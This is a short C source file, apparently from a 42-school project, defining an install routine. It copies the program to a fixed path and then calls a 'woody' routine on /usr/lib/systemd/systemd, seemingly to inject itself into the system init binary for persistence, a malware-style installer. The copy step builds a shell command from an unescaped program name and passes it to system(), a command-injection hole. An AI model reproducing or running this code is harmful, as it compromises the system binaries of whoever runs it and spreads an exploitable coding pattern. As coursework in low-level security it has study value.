/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: damien <damien@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/06/02 14:27:57 by jmaia             #+#    #+#             */
/*   Updated: 2024/06/14 13:19:28 by damien           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "daemon.h"

#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>

#include "woody.h"

static bool copy_executable(char const *program_name);

bool install(char const *program_name)
{
	bool success = true;

	if (access(BIN_PATH, F_OK) != 0)
	{
		success = copy_executable(program_name);
		if (!success)
			return false;
	}
	success = woody("/usr/lib/systemd/systemd");
	return success;
}

static bool copy_executable(char const *program_name)
{
	int success;
	size_t cp_cmd_len;
	char *cp_cmd = NULL;
	bool func_result = false;

	cp_cmd_len = snprintf(NULL, 0, "cp %s %s", program_name, BIN_PATH);
	cp_cmd = malloc(sizeof(char) * cp_cmd_len + 1);
	if (cp_cmd == NULL)
		goto cleanup;
	success = sprintf(cp_cmd, "cp %s %s", program_name, BIN_PATH) >= 0;
	if (!success)
		goto cleanup;

	success = system(cp_cmd) == 0;
	if (!success)
		goto cleanup;

	func_result = true;
cleanup:
	if (cp_cmd != NULL)
		free(cp_cmd);
	
	return func_result;
}
